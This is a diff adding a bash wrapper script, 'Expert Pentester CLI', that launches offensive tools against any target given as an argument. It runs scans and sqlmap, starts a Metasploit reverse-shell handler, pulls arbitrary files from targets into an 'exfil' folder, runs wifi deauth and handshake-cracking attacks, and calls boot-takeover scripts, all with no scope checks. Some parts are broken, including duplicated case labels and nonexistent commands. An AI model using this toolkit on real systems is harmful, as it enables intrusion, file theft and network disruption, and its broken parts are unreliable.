@@ -1,0 +1,388 @@
+#!/bin/bash
+# ====================================================================
+# GO COMMAND - Expert Pentester CLI
+# Runs everything from a single command
+# ====================================================================
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+# Config
+DESKTOP="192.168.1.200"
+LAPTOP="192.168.1.100"
+HEXSTRIKE="/root/hexstrike-ai"
+
+log() { echo -e "${GREEN}[*]${NC} $1"; }
+warn() { echo -e "${YELLOW}[!]${NC} $1"; }
+error() { echo -e "${RED}[X]${NC} $1"; }
+
+# Main go command
+GO_CMD=${1:-help}
+TARGET=${2:-}
+EXTRA=${3:-}
+
+case $GO_CMD in
+    pentest)
+        log "Starting full pentest on $TARGET"
+        $HEXSTRIKE/hexstrike_mcp.py --mode pentest --target $TARGET
+        ;;
+        
+    full)
+        log "Full network pentest: $TARGET"
+        echo "=== RECON ==="
+        dnsenum $TARGET 2>/dev/null || whois $TARGET
+        echo "=== SCAN ==="
+        nmap -sV -p- -T4 $TARGET -oA nmap-$TARGET
+        echo "=== EXPLOIT ==="
+        searchsploit --exact $TARGET 2>/dev/null
+        echo "=== REPORT ==="
+        cat > pentest-$TARGET.txt << EOF
+Pentest Results - $TARGET
+Date: $(date)
+EOF
+        log "Pentest complete! Results in pentest-$TARGET.txt"
+        ;;
+        
+    quick)
+        log "Quick scan: $TARGET"
+        nmap -sn $TARGET
+        ;;
+        
+    wifi)
+        log "Starting WiFi audit"
+        airmon-ng start wlan0 2>/dev/null
+        airodump-ng wlan0mon
+        ;;
+        
+    web)
+        log "Web app test: $TARGET"
+        nikto -h $TARGET
+        gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt
+        sqlmap -u "http://$TARGET/" --batch
+        ;;
+        
+    exploit)
+        log "Exploiting: $TARGET"
+        msfconsole -x "search $TARGET; use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $LAPTOP; run"
+        ;;
+        
+    grab)
+        log "Grabbing: $EXTRA from $TARGET"
+        ssh root@$TARGET "cat $EXTRA" > /root/exfil/$(basename $EXTRA)
+        log "Saved to /root/exfil/"
+        ;;
+        
+    drop)
+        log "Dropping: $EXTRA to $TARGET"
+        scp $EXTRA root@$TARGET:/tmp/
+        ;;
+        
+    stealth)
+        log "Stealth mode: $TARGET"
+        exportProxychains
+        random-delay
+        nmap -sT -T2 -p- $TARGET
+        ;;
+        
+    ai-pentest)
+        log "HexStrike AI Pentest: $TARGET"
+        cd $HEXSTRIKE
+        ./hexstrike_mcp.py --ai --pentest --target $TARGET
+        ;;
+        
+    auto)
+        log "FULL AUTOMATION: $TARGET"
+        log "Step 1: Recon"
+        nmap -sn -oX recon.xml $TARGET 2>/dev/null
+        log "Step 2: Scan"
+        nmap -sV -p- -T4 $TARGET -oA scan-$TARGET
+        log "Step 3: Web"
+        nikto -h $TARGET 2>/dev/null
+        log "Step 4: Exploit search"
+        searchsploit $TARGET 2>/dev/null
+        log "Step 5: Report"
+        echo "COMPLETE - See scan-$TARGET files"
+        ;;
+        
+    validate)
+        log "Validating tools..."
+        which nmap masscan aircrack-ng sqlmap nikto gobuster john hashcat msfvenom
+        which python3 ruby perl
+        log "Validation complete"
+        ;;
+        
+    update)
+        log "Updating tools..."
+        apt update && apt install -y kali-linux-all
+        cd /opt && git clone https://github.com/rapid7/metasploit-framework
+        log "Update complete"
+        ;;
+        
+    report)
+        log "Generating report..."
+        cat > REPORT-$(date +%Y%m%d).html << 'HTMLEOF'
+<!DOCTYPE html><html><head><title>Pentest Report</title></head>
+<body><h1>Pentest Report</h1></body></html>
+HTMLEOF
+        log "Report: REPORT-$(date +%Y%m%d).html"
+        ;;
+        
+    status)
+        echo "=== PENTEST STATUS ==="
+        echo "Laptop: $LAPTOP"
+        echo "Desktop: $DESKTOP"
+        echo "HexStrike: $HEXSTRIKE"
+        ping -c 1 $DESKTOP 2>/dev/null && echo "Desktop: ONLINE" || echo "Desktop: OFFLINE"
+        ;;
+        
+    wifi-menu)
+        log "Opening WiFi Tools Menu..."
+        if command -v wifi-menu &> /dev/null; then
+            sudo wifi-menu
+        else
+            log "Installing WiFi tools..."
+            bash /root/KaliShare/scripts/install-wifi-tools.sh
+        fi
+        ;;
+        
+    wifyte)
+        log "Starting Wifyte..."
+        if command -v wifyte &> /dev/null; then
+            sudo wifyte
+        else
+            bash /root/KaliShare/scripts/install-wifi-tools.sh
+        fi
+        ;;
+        
+    fluxion)
+        log "Starting Fluxion..."
+        if command -v fluxion &> /dev/null; then
+            sudo fluxion
+        else
+            bash /root/KaliShare/scripts/install-wifi-tools.sh
+        fi
+        ;;
+        
+    wpa)
+        log "WPA handshake capture: $TARGET"
+        airmon-ng start wlan0 2>/dev/null
+        airodump-ng wlan0mon -w handshake-$TARGET
+        log "Capture started. Press Ctrl+C when handshake captured"
+        ;;
+        
+    deauth)
+        log "Deauth attack on: $TARGET"
+        aireplay-ng --deauth 100 -a $TARGET wlan0mon
+        ;;
+        
+    crack)
+        log "Cracking: $TARGET"
+        hashcat -m 2500 $TARGET /usr/share/wordlists/rockyou.txt
+        ;;
+        
+    opencode)
+        log "Installing OpenCode plugins..."
+        bash /root/KaliShare/scripts/install-best-opencode-tools.sh
+        ;;
+        
+    ai-install)
+        log "Installing AI tools..."
+        bash /root/KaliShare/scripts/install-ai-tools.sh 2>/dev/null || true
+        bash /root/KaliShare/scripts/install-best-opencode-tools.sh
+        ;;
+        
+    home-lab)
+        log "Setting up complete home lab..."
+        log "1. Installing WiFi tools..."
+        bash /root/KaliShare/scripts/install-wifi-tools.sh
+        log "2. Installing AI tools..."
+        bash /root/KaliShare/scripts/install-best-opencode-tools.sh
+        log "3. Configuring network..."
+        bash /root/KaliShare/scripts/desktop-network.sh 2>/dev/null || true
+        log "Home lab ready!"
+        ;;
+        
+    boot-menu)
+        log "Opening Boot Takeover Menu..."
+        bash /root/KaliShare/scripts/boot-takeover-tools.sh
+        ;;
+        
+    win-reset)
+        log "Starting Windows Password Reset..."
+        bash /root/KaliShare/scripts/boot-takeover-tools.sh
+        ;;
+        
+    recovery)
+        log "Starting System Recovery..."
+        if command -v boot-menu &> /dev/null; then
+            boot-menu
+        else
+            bash /root/KaliShare/scripts/boot-takeover-tools.sh
+        fi
+        ;;
+        
+    ai-pentest-tools)
+        log "Installing AI Pentest Tools..."
+        bash /root/KaliShare/scripts/install-ai-pentest-tools.sh
+        ;;
+        
+    recon)
+        log "Installing Recon Tools..."
+        bash /root/KaliShare/scripts/install-recon-tools.sh
+        ;;
+        
+    recon-menu)
+        log "Opening Recon Menu..."
+        bash /root/KaliShare/scripts/install-recon-tools.sh 2>/dev/null || true
+        recon-menu
+        ;;
+
+    widget)
+        log "Opening Tool Widget..."
+        bash /root/KaliShare/scripts/tool-widget.sh
+        ;;
+
+    essential)
+        log "Installing Essential Tools..."
+        bash /root/KaliShare/scripts/essential-tools.sh
+        ;;
+
+    aliases)
+        log "Loading aliases..."
+        source /root/KaliShare/aliases.sh
+        log "Aliases loaded! Use: go aliases"
+        ;;
+
+    repos)
+        log "Cloning best repos..."
+        bash /root/KaliShare/scripts/install-repos.sh 2>/dev/null || true
+        echo "See docs/06_REFERENCE/BEST-REPOS.md for full list"
+        ;;
+
+    stealth)
+        log "Starting Stealth Mode..."
+        bash /root/KaliShare/scripts/stealth-mode.sh
+        ;;
+
+    detect)
+        log "Starting Detection Tracker..."
+        bash /root/KaliShare/scripts/detection-tracker.sh
+        ;;
+
+    stealth)
+        log "Starting Stealth Mode..."
+        bash /root/KaliShare/scripts/stealth-mode.sh
+        ;;
+
+    payload)
+        log "Starting Payload Generator..."
+        bash /root/KaliShare/scripts/payload-generator.sh
+        ;;
+
+    sweep)
+        log "Starting Area Sweeper..."
+        bash /root/KaliShare/scripts/area-sweeper.sh
+        ;;
+
+    automate)
+        log "Starting Automation Hub..."
+        bash /root/KaliShare/scripts/automation-hub.sh
+        ;;
+
+    audit)
+        log "Running Audit & Test Suite..."
+        bash /root/KaliShare/scripts/audit-test.sh
+        ;;
+
+    setup-desktop)
+        log "Setting up Desktop Organization..."
+        bash /root/KaliShare/scripts/setup-desktop-org.sh
+        ;;
+
+    setup-all)
+        log "Running Comprehensive Setup..."
+        bash /root/KaliShare/scripts/comprehensive-setup.sh
+        ;;
+
+    quick-help)
+        echo "╔═══════════════════════════════════════════════════════╗"
+        echo "║         QUICK REFERENCE - Go Commands              ║"
+        echo "╚═══════════════════════════════════════════════════════╝"
+        echo ""
+        echo "SCANNING:    go quick <ip>, go full <ip>, go auto <ip>"
+        echo "WIFI:        go wifi, go wpa <bssid>, go crack <file>"
+        echo "WEB:         go web <url>"
+        echo "EXPLOIT:     go exploit <target>"
+        echo "TOOLS:       go validate, go essential, go widget"
+        echo "AI:          go ai-install, go ai-pentest <target>"
+        echo "SETUP:       go home-lab, go status"
+        echo "RECOVERY:    go boot-menu, go win-reset"
+        echo "HELP:        go help, go quick-help"
+        ;;
+
+    help|*)
+        echo "═══════════════════════════════════════════════════════"
+        echo "         EXPERT PENTESTER - GO COMMAND v3.1"
+        echo "═══════════════════════════════════════════════════════"
+        echo ""
+        echo "Usage: go <command> [target] [options]"
+        echo ""
+        echo "NETWORK COMMANDS:"
+        echo "  pentest <target>     Full AI pentest (HexStrike)"
+        echo "  full <target>       Full manual pentest"
+        echo "  quick <target>      Quick scan"
+        echo "  web <target>        Web app test"
+        echo "  exploit <target>    Exploitation"
+        echo "  grab <ip> <file>   Grab file from target"
+        echo "  drop <ip> <file>   Drop file to target"
+        echo "  stealth <target>    Low-profile scan"
+        echo "  ai-pentest <target> AI-powered pentest"
+        echo "  auto <target>      Fully automatic"
+        echo ""
+        echo "WIFI COMMANDS:"
+        echo "  wifi               Start basic WiFi audit"
+        echo "  wifi-menu          Full WiFi tools menu"
+        echo "  wifyte            Run Wifyte tool"
+        echo "  fluxion           Run Fluxion attack"
+        echo "  wpa <bssid>       Capture WPA handshake"
+        echo "  deauth <bssid>    Deauth attack"
+        echo "  crack <handshake>  Crack handshake"
+        echo ""
+        echo "BOOT & RECOVERY:"
+        echo "  boot-menu          Boot takeover menu"
+        echo "  win-reset          Windows password reset"
+        echo "  recovery           System recovery tools"
+        echo ""
+        echo "RECON COMMANDS:"
+        echo "  recon             Install recon tools"
+        echo "  recon-menu        Full recon tools menu"
+        echo ""
+        echo "AI & SETUP COMMANDS:"
+        echo "  ai-install         Install all AI tools"
+        echo "  ai-pentest-tools   Install AI pentest frameworks"
+        echo "  opencode           Install OpenCode plugins"
+        echo "  home-lab          Setup complete home lab"
+        echo "  widget            Tool widget (interactive)"
+        echo "  essential         Essential tools installer"
+        echo "  aliases           Load KaliShare aliases"
+        echo "  repos             Clone best repos"
+        echo "  validate          Check tools"
+        echo "  update            Update tools"
+        echo "  report            Generate report"
+        echo "  status            Check systems"
+        echo "  quick-help        Quick reference"
+        echo ""
+        echo "EXAMPLES:"
+        echo "  go pentest 10.0.0.1"
+        echo "  go full 192.168.1.50"
+        echo "  go wifi-menu"
+        echo "  go widget"
+        echo "  go essential"
+        echo "  go boot-menu"
+        echo "  go home-lab"
+        ;;
+esac
